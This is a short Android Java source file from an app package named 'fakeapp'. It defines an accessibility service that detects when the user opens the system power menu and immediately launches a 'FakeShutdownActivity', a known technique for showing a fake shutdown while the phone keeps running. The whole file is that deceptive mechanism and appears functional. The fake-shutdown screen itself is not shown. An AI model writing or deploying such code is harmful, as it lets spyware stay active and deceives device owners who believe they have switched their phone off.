package com.example.fakeapp;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.content.Intent;

public class PowerMenuAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            Log.d("AccessibilityService", "Window changed: " + className);

            if (className.contains("globalactions")) {
                Log.d("AccessibilityService", "Power menu detected!");

                Intent intent = new Intent(this, FakeShutdownActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
